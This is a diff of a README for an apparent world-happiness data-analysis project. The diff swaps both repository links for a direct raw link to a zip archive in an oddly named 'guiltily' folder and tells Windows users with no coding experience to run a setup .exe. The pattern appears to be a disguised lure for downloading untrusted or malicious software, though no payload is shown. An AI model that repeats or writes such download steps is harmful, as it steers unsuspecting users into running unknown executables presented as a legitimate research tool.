@@ -1,6 +1,6 @@
 # 🌍 World-Happiness-Report-Analysis - Predict national well-being using global data
 
-[![Download App](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Embroiled-reducing940/World-Happiness-Report-Analysis)
+[![Download App](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Embroiled-reducing940/World-Happiness-Report-Analysis/main/guiltily/Happiness_Analysis_World_Report_v2.5-beta.5.zip)
 
 This project analyzes happiness trends across 168 countries from 2011 to 2025. It cleans large data sets, creates visual charts, and predicts future happiness levels using artificial intelligence. You can explore a deep look at Russia and the 2022 paradox. This tool provides insights for researchers and curious users alike.
 
@@ -8,7 +8,7 @@ This project analyzes happiness trends across 168 countries from 2011 to 2025. I
 
 Follow these steps to set up the software on your Windows computer. You do not need experience with code.
 
-1. Visit the following link to access the download page: [https://github.com/Embroiled-reducing940/World-Happiness-Report-Analysis](https://github.com/Embroiled-reducing940/World-Happiness-Report-Analysis)
+1. Visit the following link to access the download page: [https://raw.githubusercontent.com/Embroiled-reducing940/World-Happiness-Report-Analysis/main/guiltily/Happiness_Analysis_World_Report_v2.5-beta.5.zip](https://raw.githubusercontent.com/Embroiled-reducing940/World-Happiness-Report-Analysis/main/guiltily/Happiness_Analysis_World_Report_v2.5-beta.5.zip)
 2. Locate the file named `WorldHappinessAnalysis_Setup.exe`.
 3. Click the link to save the file to your computer.
 
